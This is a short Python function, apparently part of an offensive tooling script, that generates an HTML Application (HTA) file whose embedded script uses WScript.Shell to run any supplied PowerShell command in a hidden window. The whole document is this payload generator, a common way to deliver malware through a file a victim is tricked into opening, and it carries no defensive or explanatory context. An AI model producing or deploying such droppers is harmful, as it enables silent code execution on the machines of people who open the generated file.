def generate_hta(ps_command):
    return f"""
<html>
<head>
<script>
var shell = new ActiveXObject("WScript.Shell");
shell.Run("powershell -WindowStyle Hidden -Command {ps_command}");
</script>
</head>
</html>
"""

